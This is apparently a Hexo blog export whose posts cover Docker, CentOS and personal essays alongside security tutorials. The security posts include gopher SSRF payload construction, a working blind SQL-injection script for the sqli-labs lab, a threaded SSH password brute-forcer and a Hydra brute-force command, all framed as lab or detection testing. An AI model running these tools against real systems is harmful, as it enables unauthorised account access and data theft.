{"meta":{"title":"雪の迹","subtitle":"","description":"","author":"John Doe","url":"http://example.com","root":"/"},"pages":[{"title":"about","date":"2021-06-28T14:59:53.000Z","updated":"2021-07-03T10:28:32.730Z","comments":false,"path":"about/index.html","permalink":"http://example.com/about/index.html","excerpt":"","text":""},{"title":"tags","date":"2021-06-28T15:00:55.000Z","updated":"2021-07-03T10:30:49.329Z","comments":false,"path":"tags/index.html","permalink":"http://example.com/tags/index.html","excerpt":"","text":""},{"title":"friends","date":"2021-07-03T10:34:47.000Z","updated":"2021-07-03T10:42:28.898Z","comments":false,"path":"friends/index.html","permalink":"http://example.com/friends/index.html","excerpt":"","text":""},{"title":"categories","date":"2021-07-03T10:37:20.000Z","updated":"2021-07-03T10:37:31.577Z","comments":false,"path":"categories/index.html","permalink":"http://example.com/categories/index.html","excerpt":"","text":""}],"posts":[{"title":"gopher协议","slug":"gopher协议","date":"2021-09-11T17:01:43.000Z","updated":"2021-09-11T17:45:32.450Z","comments":true,"path":"2021/09/12/gopher协议/","link":"","permalink":"http://example.com/2021/09/12/gopher%E5%8D%8F%E8%AE%AE/","excerpt":"","text":"简介： gopher协议是一种信息查找系统，他将Internet上的文件组织成某种索引，方便用户从Internet的一处带到另一处。在WWW出现之前，Gopher是Internet上最主要的信息检索工具，Gopher站点也是最主要的站点，使用tcp70端口。但在WWW出现后，Gopher失去了昔日的辉煌。现在它基本过时，人们很少再使用它。它只支持文本，不支持图像。我们现在最多看到使用这个协议的时候都是在去ssrf打redis shell、读mysql数据的时候。 gopher协议格式: 1gopher://IP:port/_&#123;TCP/IP数据流&#125; 限制：gopher协议在各个编程语言中的使用限制 协议 支持情况 PHP –wite-curlwrappers且php版本至少为5.3 Java 小于JDK1.7 Curl 低版本不支持 Perl 支持 ASP.NET 小于版本3 基础使用1. 使用Gopher协议发送传输信息12$ curl gopher://192.168.109.1:6666/_abcd发送gopher get请求,可以发现_不会被显示 例子： 2. 使用Gopher协议发送GET请求在gopher协议中发送HTTP的数据，需要以下三步: 构造HTTP数据包 URL编码、替换回车换行为%0d%0a，HTTP包最后加%0d%0a代表消息结束 发送gopher协议, 协议后的IP一定要接端口 例子： 3. 使用Gopher协议发送POST请求所以想发送一个完整的POST数据包，以下4个字段是必须的： 123456POST /ssrf/post.php HTTP/1.1Host: 192.168.0.111Content-Type: application/x-www-form-urlencodedContent-Length: 11 name=yanshu 注：用脚本转的时候，每次不同的content-length都是不一样的，需要修改。 自动化 脚本 1234567891011import urllibimport urllib.parsetest =\\&quot;&quot;&quot;GET / HTTP/1.1Host: 192.168.10.1&quot;&quot;&quot;#注意后面一定要有回车，回车结尾表示http请求结束tmp = urllib.parse.quote(test)new = tmp.replace(&#x27;%0A&#x27;,&#x27;%0D%0A&#x27;)result = &#x27;_&#x27;+newprint(result) 例子 参考文章： https://cloud.tencent.com/developer/article/1610645 https://knowledge.zhaoweiguo.com/build/html/protocol/others/Gopher.html https://blog.csdn.net/weixin_45887311/article/details/107327706","categories":[{"name":"HTTP","slug":"HTTP","permalink":"http://example.com/categories/HTTP/"}],"tags":[{"name":"SSRF","slug":"SSRF","permalink":"http://example.com/tags/SSRF/"}]},{"title":"mybatis防止sql注入","slug":"mybatis防止sql注入","date":"2021-09-07T16:28:07.000Z","updated":"2021-09-07T16:51:37.190Z","comments":true,"path":"2021/09/08/mybatis防止sql注入/","link":"","permalink":"http://example.com/2021/09/08/mybatis%E9%98%B2%E6%AD%A2sql%E6%B3%A8%E5%85%A5/","excerpt":"","text":"Mybatis 的 Mapper.xml 语句中 parameterType 向SQL语句传参有两种方式：#{ } 和 ${ }。 如何排查是否存在SQL注入？1. 检查是否有$号如果你使用的是ide代码编辑器，那么可以通过全局搜索$&#123; , 快速定位到使用${ }拼接SQL的语句，在去找到外部传入参数的入口，闭合sql证明即可。 2. 检查是否有order by语句同样的在搜索是否使用order by排序语句，如果有一步一步追踪是否有外部参数，未过滤就直接传递到order by语句里面来。 为什么#&#123;&#125;不会存在SQL注入？#{ } 就类似JDBC的预编译，所以安全。 MyBatis是如何做到SQL预编译的呢？其实在框架底层，是JDBC中的PreparedStatement类在起作用，PreparedStatement是我们很熟悉的Statement的子类，它的对象包含了编译好的SQL语句。这种“准备好”的方式不仅能提高安全性，而且在多次执行同一个SQL时，能够提高效率。原因是SQL已编译好，再次执行时无需再编译。 12345678//安全的，预编译了的Connection conn = getConn();//获得连接String sql = &quot;select id, username, password, role from user where id=?&quot;; //执行sql前会预编译号该条语句PreparedStatement pstmt = conn.prepareStatement(sql); //look out！！！pstmt.setString(1, id); ResultSet rs=pstmt.executeUpdate(); ...... 与此对应的，没有进行预编译的代码如下： 12345678910//不安全的，没进行预编译private String getNameByUserId(String userId) &#123; Connection conn = getConn();//获得连接 String sql = &quot;select id,username,password,role from user where id=&quot; + id; //当id参数为&quot;3;drop table user;&quot;时，执行的sql语句如下: //select id,username,password,role from user where id=3; drop table user; PreparedStatement pstmt = conn.prepareStatement(sql); ResultSet rs=pstmt.executeUpdate(); ......&#125; 什么情况下用不了#&#123;&#125;答案是：在order by 排序语句的情况下不行，为什么？ 对于order by 我们是用不了#{}的，因为用了这个就会被自动转换成字符串，自动加引号，这样order by语句就不生效了。 例子：（注：有些加了引号也生效的，注意原来没有order by时候是怎么排序的！） 1234567891011121314151617181920212223242526272829303132mysql&gt; select * from student;+----------+----------+| name | id |+----------+----------+| xiaomi10 | 678910 || casss | 20200711 || kkk | 23432 || ddd | 44 |+----------+----------+4 rows in set (0.00 sec)mysql&gt; select * from student order by name;+----------+----------+| name | id |+----------+----------+| casss | 20200711 || ddd | 44 || kkk | 23432 || xiaomi10 | 678910 |+----------+----------+4 rows in set (0.00 sec)mysql&gt; select * from student order by &quot;name&quot;;+----------+----------+| name | id |+----------+----------+| xiaomi10 | 678910 || casss | 20200711 || kkk | 23432 || ddd | 44 |+----------+----------+4 rows in set (0.00 sec) 如何处理order by的情况？使用了 ${}后，使用者需要自行过滤输入，方法有： 1、代码层使用白名单的方式，限制 sortBy 允许的值，如只能为 name, email 字段，异常情况则设置为默认值 name。 123456&lt;select id=&quot;getUserListSortBy&quot; resultType=&quot;org.example.User&quot;&gt; SELECT * FROM user &lt;if test=&quot;sortBy == &#x27;name&#x27; or sortBy == &#x27;email&#x27;&quot;&gt; order by $&#123;sortBy&#125; &lt;/if&gt;&lt;/select&gt; 2、使用正则过滤特殊字符，因为就是DB表的字段的规则，只能是：英文，数字，下划线。 更多场景1、like 语句like不能直接用#，可以先用concat加上%包裹再用 1select * from news where tile like concat(‘%’,#&#123;title&#125;, ‘%’) 2、In语句in之后多个参数也不能直接用#，可以foreach遍历 12select * from news where id in&lt;foreach collection=&quot;ids&quot; item=&quot;item&quot; open=&quot;(&quot;separator=&quot;,&quot; close=&quot;)&quot;&gt;#&#123;item&#125; &lt;/foreach&gt; 参考文章： https://www.cnblogs.com/mysticbinary/p/12613243.html https://zhuanlan.zhihu.com/p/39408398 https://chenguoji.com/2019/07/26/che-di-gan-diao-e-xin-de-sql-zhu-ru-lou-dong-yi-wang-da-jin/ https://springboot.io/t/topic/905","categories":[{"name":"security","slug":"security","permalink":"http://example.com/categories/security/"}],"tags":[{"name":"sql注入","slug":"sql注入","permalink":"http://example.com/tags/sql%E6%B3%A8%E5%85%A5/"},{"name":"java","slug":"java","permalink":"http://example.com/tags/java/"}]},{"title":"SQL注入之布尔盲注","slug":"SQL注入之布尔盲注","date":"2021-08-06T15:10:33.000Z","updated":"2021-08-06T15:14:25.301Z","comments":true,"path":"2021/08/06/SQL注入之布尔盲注/","link":"","permalink":"http://example.com/2021/08/06/SQL%E6%B3%A8%E5%85%A5%E4%B9%8B%E5%B8%83%E5%B0%94%E7%9B%B2%E6%B3%A8/","excerpt":"","text":"实验环境 1.运行： docker info2.搜索sqli-labs： docker search sqli-labs3.建立镜像： docker pull acgpiano/sqli-labs4.查看存在的镜像： docker images5.运行存在的镜像：docker run -dt --name sqli-labs -p 8081:80 --rm acgpiano/sqli-labs 一、前言记录sqli-labs中的布尔盲注脚本，不定期更新中… 二、原理什么叫盲注，是指在sql执行过程中，执行结果不回显到前端（不明显），这个时只能尝试盲注。盲注又可以分为以下2种： 基于布尔盲注 基于时间的盲注 盲注经常会用到以下SQL函数： length(str) ：返回字符串str的长度 substr/substring(str, pos, len) ：将str从pos位置开始截取len长度的字符进行返回，pos从1开始 mid(str,pos,len) ：跟上面的一样，截取字符串 ascii(str) ：返回字符串str的最左面字符的ASCII代码值 ord(str) ：将字符或布尔类型转成ascll码 if(a,b,c) ：a为条件，a为true，返回b，否则返回c，如if(1&gt;2,1,0),返回0 实现思路 先判断盲注是否存在，例如&#39; and &#39;a&#39;=&#39;a 等。 代码通过length(payload)判断payload获取结果的长度。 依据步骤2获取的长度，根据substr(str, pos, len)采用2层迭代遍历。 拓展二分法？ 三、例子sqli-labs Less-11234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950515253545556575859#!/usr/bin/python3# -*- coding: utf-8 -*-&quot;&quot;&quot; * @Author whale4u * @Date 2021/5/6 * @Version 1.0&quot;&quot;&quot;import stringimport requests# mysql不区分大小写，一般表名、列名都是由字母组成的比较多，所以把字母集放前面，先枚举chr_str = string.ascii_lowercase + string.punctuation + string.digits# payloadpayload_t = &quot;(select group_concat(table_name) from information_schema.tables where table_schema=database())&quot;payload_c = &quot;(select group_concat(column_name) from information_schema.columns where table_schema=database())&quot;# 获取长度payload# 字符型payload_len = &quot;&#x27; and length(&#123;0&#125;)=&#123;1&#125; --+&quot;# 数值型# payload_len = &quot;&#x27; and length(&#123;0&#125;)=&#123;1&#125; --+&quot;# 获取表名payload，注意这里后面字符要用单引号括起来！否则总为真。payload_name = &quot;&#x27; and substr(&#123;0&#125;,&#123;1&#125;,1)=&#x27;&#123;2&#125;&#x27; --+&quot;# urlurl = &quot;http://127.0.0.1:8081/Less-1/?id=1&quot;# markmark = &quot;Dumb&quot;class SQLInjector: def __init__(self, url, mark, payload): self.url = url self.mark = mark self.payload = payload def get_length(self): # 先要获取payload长度才能遍历 i = 1 while True: # http://127.0.0.1:8081/Less-1/?id=1&#x27; and length(&#123;0&#125;)=&#123;1&#125; --+ full_url = (self.url + payload_len).format(self.payload, i) req = requests.get(full_url) if self.mark in req.text: print(&quot;len: &quot;, i) return i # break i += 1 def get_name(self): length = self.get_length() output = &quot;&quot; # 从第1位开始遍历 for i in range(1, length+1): for j in chr_str: # http://127.0.0.1:8081/Less-1/?id=1&#x27; and substr(&#123;0&#125;,&#123;1&#125;,1)=&#x27;&#123;2&#125;&#x27; --+ full_url = (self.url + payload_name).format(self.payload, i, j) req = requests.get(full_url) if self.mark in req.text: output = output + j print(&quot;col/tab: &quot;, output) breakif __name__ == &#x27;__main__&#x27;: # print(chr_str) sqli = SQLInjector(url, mark, payload_c) # sqli.get_length() sqli.get_name() 运行截图： 参考文章： SQL注入之布尔盲注","categories":[{"name":"security","slug":"security","permalink":"http://example.com/categories/security/"}],"tags":[{"name":"python","slug":"python","permalink":"http://example.com/tags/python/"},{"name":"sql注入","slug":"sql注入","permalink":"http://example.com/tags/sql%E6%B3%A8%E5%85%A5/"}]},{"title":"Python实现SSH爆破","slug":"Python实现SSH爆破","date":"2021-08-05T07:47:51.000Z","updated":"2021-08-06T15:17:03.641Z","comments":true,"path":"2021/08/05/Python实现SSH爆破/","link":"","permalink":"http://example.com/2021/08/05/Python%E5%AE%9E%E7%8E%B0SSH%E7%88%86%E7%A0%B4/","excerpt":"","text":"前言 Python实现SSH爆破，用来测试hids检测效果。 准备工作 安装paramiko：pip install paramiko 代码12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152535455#!/usr/bin/python2import paramiko, sys, os, socket, threading, time import itertools,string,crypt# 密码最大长度PASS_SIZE = 12def bruteforce_list(charset, maxlength): return (&#x27;&#x27;.join(candidate) for candidate in itertools.chain.from_iterable(itertools.product(charset, repeat=i) for i in range(1, maxlength + 1)))def attempt(Password): # 攻击IP、用户、端口 IP = &quot;10.127.127.61&quot; USER = &quot;root&quot; PORT=22 try: ssh = paramiko.SSHClient() ssh.load_system_host_keys() ssh.set_missing_host_key_policy(paramiko.MissingHostKeyPolicy()) try: ssh.connect(IP , port=PORT, username=USER, password=Password) print &quot;Connected successfully. Password = &quot;+Password except paramiko.AuthenticationException, error: print &quot;Incorrect password: &quot;+Password pass except socket.error, error: print error pass except paramiko.SSHException, error: print error print &quot;Most probably this is caused by a missing host key&quot; pass except Exception, error: print &quot;Unknown error: &quot;+error pass ssh.close() except Exception,error : print errorletters_list = &#x27;abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQSTUVWXYZ1234567890!@#$&amp;()&#x27;for i in bruteforce_list(letters_list, PASS_SIZE): t = threading.Thread(target=attempt, args=(i,)) t.start() time.sleep(0.3)sys.exit(0) 效果 [root@localhost ~]# python ssh_bruteforcer.py/usr/lib/python2.7/site-packages/paramiko/transport.py:33: CryptographyDeprecationWarning: Python 2 is no longer supported by the Python core team. Support for it is now deprecated in cryptography, and will be removed in the next release. from cryptography.hazmat.backends import default_backendIncorrect password: aIncorrect password: bIncorrect password: cIncorrect password: dIncorrect password: e","categories":[{"name":"security","slug":"security","permalink":"http://example.com/categories/security/"}],"tags":[{"name":"python","slug":"python","permalink":"http://example.com/tags/python/"},{"name":"ssh","slug":"ssh","permalink":"http://example.com/tags/ssh/"}]},{"title":"Hydra简明教程","slug":"Hydra简明教程","date":"2021-08-05T02:45:00.000Z","updated":"2021-08-05T02:50:59.000Z","comments":true,"path":"2021/08/05/Hydra简明教程/","link":"","permalink":"http://example.com/2021/08/05/Hydra%E7%AE%80%E6%98%8E%E6%95%99%E7%A8%8B/","excerpt":"","text":"安装centos安装教程：Centos7安装Hydra(爆破神器) macos安装：brew install hydra 使用SSH爆破 使用密码文件 hydra -l root -P top100_ssh_vps.txt 10.127.127.79 ssh 使用用户名、密码文件 RDP爆破 使用密码文件 使用用户名、密码文件 引用 密码字典：PasswordDic","categories":[{"name":"security","slug":"security","permalink":"http://example.com/categories/security/"}],"tags":[{"name":"hydra","slug":"hydra","permalink":"http://example.com/tags/hydra/"}]},{"title":"docker-compose","slug":"docker-compose","date":"2021-07-18T03:16:56.000Z","updated":"2021-07-19T15:54:55.921Z","comments":true,"path":"2021/07/18/docker-compose/","link":"","permalink":"http://example.com/2021/07/18/docker-compose/","excerpt":"","text":"overviewCompose is a tool for defining and running multi-container Docker applications. With Compose, you use a YAML file to configure your application’s services. Then, with a single command, you create and start all the services from your configuration. Using Compose is basically a three-step process: Define your app’s environment with a Dockerfile so it can be reproduced anywhere. Define the services that make up your app in docker-compose.yml so they can be run together in an isolated environment. Run docker compose up Get started with Docker ComposeOn this page you build a simple Python web application running on Docker Compose. The application uses the Flask framework and maintains a hit counter in Redis. While the sample uses Python, the concepts demonstrated here should be understandable even if you’re not familiar with it. PrerequisitesMake sure you have already installed both Docker Engine and Docker Compose. You don’t need to install Python or Redis, as both are provided by Docker images. Step 1: Setup1、Create a directory for the project: 12$ mkdir composetest$ cd composetest 2、Create a file called app.py in your project directory and paste this in: 1234567891011121314151617181920212223import timeimport redisfrom flask import Flaskapp = Flask(__name__)cache = redis.Redis(host=&#x27;redis&#x27;, port=6379)def get_hit_count(): retries = 5 while True: try: return cache.incr(&#x27;hits&#x27;) except redis.exceptions.ConnectionError as exc: if retries == 0: raise exc retries -= 1 time.sleep(0.5)@app.route(&#x27;/&#x27;)def hello(): count = get_hit_count() return &#x27;Hello World! I have been seen &#123;&#125; times.\\n&#x27;.format(count) In this example, redis is the hostname of the redis container on the application’s network. We use the default port for Redis, 6379. 3、Create another file called requirements.txt in your project directory and paste this in: 12flaskredis Step 2: Create a DockerfileIn this step, you write a Dockerfile that builds a Docker image. The image contains all the dependencies the Python application requires, including Python itself. In your project directory, create a file named Dockerfile and paste the following: 1234567891011# syntax=docker/dockerfile:1FROM python:3.7-alpineWORKDIR /codeENV FLASK_APP=app.pyENV FLASK_RUN_HOST=0.0.0.0RUN apk add --no-cache gcc musl-dev linux-headersCOPY requirements.txt requirements.txtRUN pip install -r requirements.txtEXPOSE 5000COPY . .CMD [&quot;flask&quot;, &quot;run&quot;] This tells Docker to: Build an image starting with the Python 3.7 image. Set the working directory to /code. Set environment variables used by the flask command. Install gcc and other dependencies Copy requirements.txt and install the Python dependencies. Add metadata to the image to describe that the container is listening on port 5000 Copy the current directory . in the project to the workdir . in the image. Set the default command for the container to flask run. For more information on how to write Dockerfiles, see the Docker user guide and the Dockerfile reference. Step 3: Define services in a Compose fileCreate a file called docker-compose.yml in your project directory and paste the following: 12345678version: &quot;3.9&quot;services: web: build: . ports: - &quot;5000:5000&quot; redis: image: &quot;redis:alpine&quot; This Compose file defines two services: web and redis. Web serviceThe web service uses an image that’s built from the Dockerfile in the current directory. It then binds the container and the host machine to the exposed port, 5000. This example service uses the default port for the Flask web server, 5000. Redis serviceThe redis service uses a public Redis image pulled from the Docker Hub registry. Step 4: Build and run your app with Compose From your project directory, start up your application by running docker-compose up. Enter http://localhost:5000/ in a browser to see the application running. Step 5: Edit the Compose file to add a bind mountEdit docker-compose.yml in your project directory to add a bind mount for the web service: 123456789101112version: &quot;3.9&quot;services: web: build: . ports: - &quot;5000:5000&quot; volumes: - .:/code environment: FLASK_ENV: development redis: image: &quot;redis:alpine&quot; The new volumes key mounts the project directory (current directory) on the host to /code inside the container, allowing you to modify the code on the fly, without having to rebuild the image. The environment key sets the FLASK_ENV environment variable, which tells flask run to run in development mode and reload the code on change. This mode should only be used in development. Step 6: Re-build and run the app with ComposeFrom your project directory, type docker-compose up to build the app with the updated Compose file, and run it. Step 7: Update the applicationBecause the application code is now mounted into the container using a volume, you can make changes to its code and see the changes instantly, without having to rebuild the image. Change the greeting in app.py and save it. For example, change the Hello World! message to Hello from Docker!: 1return &#x27;Hello from Docker! I have been seen &#123;&#125; times.\\n&#x27;.format(count) Refresh the app in your browser. The greeting should be updated, and the counter should still be incrementing. Step 8: Experiment with some other commandsIf you want to run your services in the background, you can pass the -d flag (for “detached” mode) to docker-compose up and use docker-compose ps to see what is currently running: 1234567891011$ docker-compose up -dStarting composetest_redis_1...Starting composetest_web_1...$ docker-compose ps Name Command State Ports -------------------------------------------------------------------------------------composetest_redis_1 docker-entrypoint.sh redis ... Up 6379/tcp composetest_web_1 flask run Up 0.0.0.0:5000-&gt;5000/tcp The docker-compose run command allows you to run one-off commands for your services. For example, to see what environment variables are available to the web service: 1$ docker-compose run web env See docker-compose --help to see other available commands. You can also install command completion for the bash and zsh shell, which also shows you available commands. If you started Compose with docker-compose up -d, stop your services once you’ve finished with them: 1$ docker-compose stop You can bring everything down, removing the containers entirely, with the down command. Pass --volumes to also remove the data volume used by the Redis container: 1$ docker-compose down --volumes At this point, you have seen the basics of how Compose works. 原文链接： https://docs.docker.com/compose/gettingstarted/","categories":[{"name":"docker","slug":"docker","permalink":"http://example.com/categories/docker/"}],"tags":[{"name":"docker-compose","slug":"docker-compose","permalink":"http://example.com/tags/docker-compose/"}]},{"title":"黑苹果+Win10双系统时间晚8小时修复方法","slug":"黑苹果-Win10双系统时间晚8小时修复方法","date":"2021-07-02T01:35:51.000Z","updated":"2021-07-15T14:37:02.487Z","comments":true,"path":"2021/07/02/黑苹果-Win10双系统时间晚8小时修复方法/","link":"","permalink":"http://example.com/2021/07/02/%E9%BB%91%E8%8B%B9%E6%9E%9C-Win10%E5%8F%8C%E7%B3%BB%E7%BB%9F%E6%97%B6%E9%97%B4%E6%99%9A8%E5%B0%8F%E6%97%B6%E4%BF%AE%E5%A4%8D%E6%96%B9%E6%B3%95/","excerpt":"","text":"修改Windows注册表 使用快捷键“Win”+ 【R】组合快捷键。在打开后面键入命令：regedit 修改 win10 注册表，点击打开 HKEY_LOCAL_MACHINE\\SYSTEM\\CurrentControlSet\\Control\\TimeZoneInformation\\ 新建一项 DWORD 值 名为 “ RealTimeIsUniversal ”双击改成值为 1 参考文章 https://v2ex.com/t/330394","categories":[],"tags":[{"name":"搞机","slug":"搞机","permalink":"http://example.com/tags/%E6%90%9E%E6%9C%BA/"}]},{"title":"Hello World","slug":"hello-world","date":"2021-06-30T02:41:23.000Z","updated":"2021-06-30T02:41:23.000Z","comments":true,"path":"2021/06/30/hello-world/","link":"","permalink":"http://example.com/2021/06/30/hello-world/","excerpt":"","text":"Welcome to Hexo! This is your very first post. Check documentation for more info. If you get any problems when using Hexo, you can find the answer in troubleshooting or you can ask me on GitHub. Quick StartCreate a new post1$ hexo new &quot;My New Post&quot; More info: Writing Run server1$ hexo server More info: Server Generate static files1$ hexo generate More info: Generating Deploy to remote sites1$ hexo deploy More info: Deployment","categories":[],"tags":[]},{"title":"Centos常用命令","slug":"centos常用命令","date":"2021-06-30T02:37:28.000Z","updated":"2021-07-03T10:38:07.273Z","comments":true,"path":"2021/06/30/centos常用命令/","link":"","permalink":"http://example.com/2021/06/30/centos%E5%B8%B8%E7%94%A8%E5%91%BD%E4%BB%A4/","excerpt":"","text":"查询centos版本：1cat /etc/redhat-release 端口监听服务：查询端口监听情况：netstat -lnautp | grep LISTEN 修改目录所有者1.更改目录所有者命令: chown -R 用户名称 目录名称 2.更改目录权限命令: chmod -R 755 目录名称 to be continue …","categories":[{"name":"linux","slug":"linux","permalink":"http://example.com/categories/linux/"}],"tags":[{"name":"centos","slug":"centos","permalink":"http://example.com/tags/centos/"}]},{"title":"更好的别人","slug":"更好的别人","date":"2021-06-28T15:27:28.000Z","updated":"2021-06-28T15:27:51.026Z","comments":true,"path":"2021/06/28/更好的别人/","link":"","permalink":"http://example.com/2021/06/28/%E6%9B%B4%E5%A5%BD%E7%9A%84%E5%88%AB%E4%BA%BA/","excerpt":"","text":"引言别人都在等待更好的别人，而我在等着更好的你。 循环转眼已经毕业数年，感觉陷入日复一日の循环中而丧失了某些头脑中机能。有时候会想，是否我们的生活本该是这个样子，是否到我们这个年纪本该就是这个样子？生活什么时候变成了什么都想要，什么都差点够到的样子 —— 感觉就像被胡萝卜牵着走的驴，不知道自己的目的地是何方。 别人 大概两年时间中，认识了100多个不同院系的北大同学，觉得他们上学时比我在大学时目标明确的很多，他们非常清楚的知道自己要什么，以及为了达到这个目标要走什么样的路径，需要哪些资源等等。这些东西感觉他们每个人都很清楚。而我们当时上学的时候，大家每天就是上课自习打游戏之类的，迷迷糊糊毕业之后更多的是时代大势推动着在前进。至少我自己在遇到老婆之前就从来没有过什么职业规划之类的，靠技术吃饭的，大概就是看看同学去哪，就跟着去哪先混着，混出点名堂了再跳槽这种。 这是知乎上一个看着很有感触的回答。目标明确 + 持续不懈的努力 — 这就是成功人士和普通人的差别吧，这也是看到众多鸡汤文中浅析不过的道理了。难道我们就是”知道了很多为人处世的道理，依旧过不好这一生”的例子？ 存在或许，有些事情总是我想做的吧？不是可劲玩喜欢的游戏，不是更好的车、更大的房子，甚至赚更多的钱 。也许是慢慢察觉到要慢慢变成一个无聊的中年人，我开始想到王小波的“在我看来，春天里一棵小草生长，它没有什么目的。风起时一匹公马发情，它也没有什么目的。草长马发情，绝非表演给什么人看的，这就是存在本身”。那么，我们存在的本身是什么呢？ 回忆记得《简单法则》里有句话，大概意思是等到年老时，除了回忆我们一无所需，除了回忆我们一无所有。王小波说“以后我要真诚地做一切事情，我要像笛卡尔一样思辨，像堂吉诃德一样攻击风车。无论写诗还是做爱，都要以极大的真诚完成。眼前就是罗得岛，我就在这里跳跃——我这么做什么都不为，这就是存在本身。” 也许只要真诚地去做一切事情，便很好了吧~","categories":[],"tags":[{"name":"随の想","slug":"随の想","permalink":"http://example.com/tags/%E9%9A%8F%E3%81%AE%E6%83%B3/"}]},{"title":"恰同学少年","slug":"恰同学少年","date":"2021-06-28T15:24:20.000Z","updated":"2021-06-28T15:26:38.581Z","comments":true,"path":"2021/06/28/恰同学少年/","link":"","permalink":"http://example.com/2021/06/28/%E6%81%B0%E5%90%8C%E5%AD%A6%E5%B0%91%E5%B9%B4/","excerpt":"","text":"引言如果一切都可以重来，你会选择怎样的开始？ 遥远的Ta如果你有兴趣继续看下去，也许也会有耐心听我介绍自己的过去：一个遥远的过去，犹如梦境中的清晨，晶莹剔透的雨滴，顺着老屋的瓦，缓缓坠入沟渠。那是一个仿佛已经很久远的年代。那时候的村庄，没有手机，没有互联网，也没有“非常6+1”的幸运观众。有的只是青山，有的只是小溪，还有傍晚夕阳西下时升起的袅袅炊烟。而我，就是在这个宛如与世隔绝的村庄，度过了人生最初的十年。 邂逅死亡在记忆中某个已褪色的冬天，暴雨过后河水暴涨，叫嚣着漫过河堤，淹没原野。当时的我穿着厚重的大棉衣，流着鼻涕，一个人在河堤上慢慢地走着。已经记不清当时为什么要沿着河堤走(回家)，只记得脚下的河堤突然垮了，一脚踏空的我掉入洪水中。而周围，一个人都没有。 河水咆哮着灌入我的衣服里，发出类似于往玻璃瓶中倒水的声音。我下意识地往岸边游去，伸出手想要抓住什么。然而，洪水却以更快的速度把我往下游推。当时年幼的我头脑一片空白，意识到“我可能会死”。 死亡对一个孩子来说，意味着什么？我不知道，只是感到一股难以抵抗的恐惧感，唯一能做的就是臣服于本能 —— 我猛地把头扎入冰冷的水中，使出了全身的力气，以潜泳的方式拼命地往岸边游去终于，我抓住了什么东西，顺势爬上了岸边，像一条落水狗一样，趴在岸边喘着粗气、瑟瑟发抖。 平凡之路也许是因为那段宛如梦境的经历，让我的整个求学生涯都伴随着某种形式上的孤独感。虽然已经记不清楚，自己怎么一个人走过来的。整个求学期间，“不合群”给别人的最大感觉。与其说“不合群”，不如说“气质不对”（主要看气质）—— 大概给人一种“看不出有什么太奇怪，但就是和我们不一样”的感觉吧。于是乎，我一个人去看书、一个人去长跑、一个人去做那些可以一个人能做好的事情。在读书期间，孤独给我的不止是夜间路灯下那个形单影只的背影，还有某种程度上的钝感。后来，依赖着类似于堂吉诃德式的勇气，我走完了整个小初高中，走向了大学。 而我的大学，并没有让我达到某个方面某种质的飞跃，也没有什么专业性积累，这也算是某种程度上的虚度光阴吧。在大学期间，开始逐渐接触到这么一种说法，即“为编程而生”。 你不仅得有天赋，还得具备激情，才能成为一名优秀的程序员。 … 好像那些写代码的人是早就决定干这一行似的，“当他们还是孩子的时候，他们就打算将来去写代码”。如果你缺少这两个因素之一，那么你要么是一个骗子，要么不会走得太远。 我从来都不觉得自己有过什么天赋，更不会有那种“为编程而生”的感觉。在专业课学得不好的时候，也会怀疑自己是不是选错专业了。然而，地球在转动，生活也要继续，我唯一能做的，就是学好专业知识，以期毕业后能混口饭吃。既然已经选择，又无讨价的余地，唯有硬着头皮上了。既便如此，“闭门造车”坏习惯很快成为我的拦路虎，整个大学都是重复“上课睡觉，考前预习”的模式。在挂了几科后，甚至一度怀疑自己能否顺利毕业，也算是“学渣”的烦恼吧。直到后来接触到鱼C，才觉得稍微有点编程姿态，也渐渐有点程序员的样子。 言及方法，也许是因为社会节奏越来越快，社会上弥漫着一股类似于“方法不对，努力白费”、“如果方向错了，停止就是进步”的言论。浮躁让我们把注重点放在“方法”、“秘诀”之类的捷径上，而忽略了努力本身。试想，从小喝的鸡汤，对我们的进步是否真的有所帮助？ 今年七月初，我只身一人飞到深圳，这个从未涉足的城市。从没有想过要“出任CEO，迎娶白富美，走向人生巅峰”，只想着怎么自力更生，养活自己。快3个月过去了，我很幸运地找到了一份工作，和无数慕名而来的年轻人一样，挥洒着自己的汗水，为了一个可能更美好的明天奋斗着。 后记回到最开始的问题“如果一切都可以重来，你会选择怎样的开始？现在跳到另一个问题“如果一切都只能继续，你会选择怎样的继续？” 众里寻她，如果找到的只是无奈，你是否继续等待？蓦然回首，如果剩下的只有苍白，你是否能够释怀？ 执着于自己的执着，落寞于自己的错过，带着伤痛和坚毅，每个人都能走得更远。","categories":[],"tags":[{"name":"随の想","slug":"随の想","permalink":"http://example.com/tags/%E9%9A%8F%E3%81%AE%E6%83%B3/"}]}],"categories":[{"name":"HTTP","slug":"HTTP","permalink":"http://example.com/categories/HTTP/"},{"name":"security","slug":"security","permalink":"http://example.com/categories/security/"},{"name":"docker","slug":"docker","permalink":"http://example.com/categories/docker/"},{"name":"linux","slug":"linux","permalink":"http://example.com/categories/linux/"}],"tags":[{"name":"SSRF","slug":"SSRF","permalink":"http://example.com/tags/SSRF/"},{"name":"sql注入","slug":"sql注入","permalink":"http://example.com/tags/sql%E6%B3%A8%E5%85%A5/"},{"name":"java","slug":"java","permalink":"http://example.com/tags/java/"},{"name":"python","slug":"python","permalink":"http://example.com/tags/python/"},{"name":"ssh","slug":"ssh","permalink":"http://example.com/tags/ssh/"},{"name":"hydra","slug":"hydra","permalink":"http://example.com/tags/hydra/"},{"name":"docker-compose","slug":"docker-compose","permalink":"http://example.com/tags/docker-compose/"},{"name":"搞机","slug":"搞机","permalink":"http://example.com/tags/%E6%90%9E%E6%9C%BA/"},{"name":"centos","slug":"centos","permalink":"http://example.com/tags/centos/"},{"name":"随の想","slug":"随の想","permalink":"http://example.com/tags/%E9%9A%8F%E3%81%AE%E6%83%B3/"}]}